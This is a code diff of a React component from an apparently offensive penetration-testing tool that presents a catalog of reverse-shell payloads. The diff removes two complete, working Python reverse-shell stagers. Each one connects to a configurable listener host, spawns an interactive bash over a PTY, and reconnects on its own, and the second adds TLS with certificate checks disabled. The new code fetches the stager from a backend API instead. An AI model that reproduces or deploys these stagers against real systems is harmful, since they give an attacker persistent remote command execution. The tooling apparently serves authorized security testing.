@@ -1,4 +1,5 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
+import { getStager } from "./api";
 
 // A curated reverse-shell payload catalog — "recce writes the payload for you". Templates
 // are filled with the listener's LHOST + port so a tester never hand-assembles a one-liner
@@ -39,62 +40,8 @@ const CATALOG: { group: string; items: P[] }[] = [
 // a real PTY (full interactivity from byte one — no stabilize dance), announces a session
 // token so it rebinds to the SAME recce session, and auto-reconnects on drop. A script, not
 // a compiled implant — plain transport, no toolchain.
-const STAGER = `python3 -c 'import socket,os,pty,select,time,signal
-T="{TOKEN}";H="{LHOST}";P={PORT}
-while 1:
- s=None;pid=0
- try:
-  s=socket.socket();s.connect((H,P));s.send(b"RECCE1 "+T.encode()+b"\\n")
-  pid,fd=pty.fork()
-  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])
-  while 1:
-   r=select.select([s,fd],[],[])[0]
-   if s in r:
-    d=s.recv(1024)
-    if not d:break
-    os.write(fd,d)
-   if fd in r:
-    d=os.read(fd,1024)
-    if not d:break
-    s.send(d)
- except Exception:pass
- try:
-  if pid>0:os.kill(pid,signal.SIGKILL)
- except:pass
- try:
-  if s:s.close()
- except:pass
- time.sleep(5)'`;
-
-// TLS-encrypted variant of the robust stager (matches sessions/stagers.py python_tls_stager).
-const TLS_STAGER = `python3 -c 'import socket,os,pty,select,time,signal,ssl
-T="{TOKEN}";H="{LHOST}";P={PORT}
-while 1:
- s=None;pid=0
- try:
-  raw=socket.socket();raw.connect((H,P))
-  s=ssl._create_unverified_context().wrap_socket(raw,server_hostname=H)
-  s.send(b"RECCE1 "+T.encode()+b"\\n")
-  pid,fd=pty.fork()
-  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])
-  while 1:
-   r=select.select([s,fd],[],[],1)[0]
-   if s in r or s.pending():
-    d=s.recv(4096)
-    if not d:break
-    os.write(fd,d)
-   if fd in r:
-    d=os.read(fd,1024)
-    if not d:break
-    s.send(d)
- except Exception:pass
- try:
-  if pid>0:os.kill(pid,signal.SIGKILL)
- except:pass
- try:
-  if s:s.close()
- except:pass
- time.sleep(5)'`;
+// The robust reconnecting-PTY stager is served by the backend (single source of truth,
+// see /api/stager) and fetched below — no hardcoded copy to drift out of sync.
 
 // raw one-liners for a TLS listener (plaintext ones won't complete the TLS handshake)
 const TLS_CATALOG: { group: string; items: P[] }[] = [
@@ -126,9 +73,10 @@ function CopyLine({ text }: { text: string }) {
 export function PayloadCatalog({ port, tls = false }: { port: number; tls?: boolean }) {
   const [lhost, setLhost] = useState(location.hostname);
   const [token] = useState(genToken);
+  const [stager, setStager] = useState<string>("");
+  useEffect(() => { getStager(tls).then(setStager).catch(() => setStager("")); }, [tls]);
   const fill = (t: string) =>
     t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port)).split("{TOKEN}").join(token);
-  const stager = tls ? TLS_STAGER : STAGER;
   const catalog = tls ? TLS_CATALOG : CATALOG;
   return (
     <div className="payload-catalog">
@@ -142,9 +90,9 @@ export function PayloadCatalog({ port, tls = false }: { port: number; tls?: bool
         <div className="payload-group-h robust">★ Robust · auto-reconnect PTY{tls ? " · TLS" : ""} (recommended)</div>
         <div className="payload-item robust-item">
           <span className="payload-label">python</span>
-          <code className="payload-code">{fill(stager)}</code>
-          <span className="payload-note muted small">full PTY, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
-          <CopyLine text={fill(stager)} />
+          <code className="payload-code">{stager ? fill(stager) : "loading…"}</code>
+          <span className="payload-note muted small">full PTY + resize, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
+          {stager && <CopyLine text={fill(stager)} />}
         </div>
       </div>
 
